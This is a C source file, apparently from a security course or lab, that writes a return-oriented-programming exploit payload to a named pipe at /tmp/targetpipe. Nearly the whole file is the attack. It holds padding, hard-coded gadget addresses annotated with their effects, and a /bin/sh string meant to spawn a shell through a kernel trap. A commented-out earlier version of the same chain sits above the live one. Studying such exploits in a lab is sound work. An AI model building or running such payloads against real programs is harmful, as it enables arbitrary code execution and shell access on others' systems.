#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  // writecmd(PIPEPATH, "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
  //                     "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
  //                     "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
  //                     "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
  //                     "\x09\x09\x09\x09"
  //                     "\x68\x07\xAD\xBB"
  //                     "\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB"
  //                     "\xD4\xBE\xB3\xBB" // 0 out edx
  //                     "\x22\xA4\xBA\xBB\xD8\x28\xBF\xBF" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
  //                     "\x7E\xB8\xB6\xBB" // move edx (0 word to y array)
  //                     "\x62\x26\xB4\xBB" // skip over y array (inc esp by 8)
  //                     //"\xf6\xf6\xb7\xbb\xAA\xAA\xAA\xAA" // y array (addy of bin/sh followed by 0 word represented here by filler)
  //                     "\xF0\x28\xBF\xBF\xAA\xAA\xAA\xAA" // y array (addy of bin/sh followed by 0 word represented here by filler)
  //                     "\xE5\xB6\xA9\xBB" // trap into kernel followed by
  //                     "\xA0\xA0\xA0\xA0" // dummy value
  //                     //"\xf6\xf6\xb7\xbb" // addy of bin/sh (x) 
  //                     "\xF0\x28\xBF\xBF" // addy of bin/sh (x) 
  //                     "\xD4\x28\xBF\xBF" // addy of y
  //                     "\xD8\x28\xBF\xBF" // addy of y + 4
  //                     "\x2F\x62\x69\x6E\x2f\x73\x68\x00"); // /bin/sh string
    writecmd(PIPEPATH, "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      "\x09\x09\x09\x09"
                      "\x68\x07\xAD\xBB"
                      "\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB"
                      "\xD4\xBE\xB3\xBB" // 0 out edx
                      "\x22\xA4\xBA\xBB\xE4\x28\xBF\xBF" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
                      "\x7E\xB8\xB6\xBB" // move edx (0 word to y array)
                      "\x22\xA4\xBA\xBB\xFC\x28\xBF\xBF" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
                      "\x7E\xB8\xB6\xBB" // move edx (0 word to 3rd param passed to syscall)
                      "\x62\x26\xB4\xBB" // skip over y array (inc esp by 8)
                      //"\xf6\xf6\xb7\xbb\xAA\xAA\xAA\xAA" // y array (addy of bin/sh followed by 0 word represented here by filler)
                      "\xE0\x28\xBF\xBF\xAA\xAA\xAA\xAA" // y array (addy of bin/sh followed by 0 word represented here by filler)
                      "\xE5\xB6\xA9\xBB" // trap into kernel followed by
                      "\x01\x01\x01\x01\x01\x01\x01\x01" // dummy value
                      //"\xf6\xf6\xb7\xbb" // addy of bin/sh (x) 
                      "\xE0\x28\xBF\xBF" // addy of bin/sh (x) 
                      "\xE4\x28\xBF\xBF" // addy of y
                      "\xAA\xAA\xAA\xAA" // filler for 0 bytes
                      "\x2F\x62\x69\x6E\x2f\x73\x68\x00"); // /bin/sh string
  return 0;
}
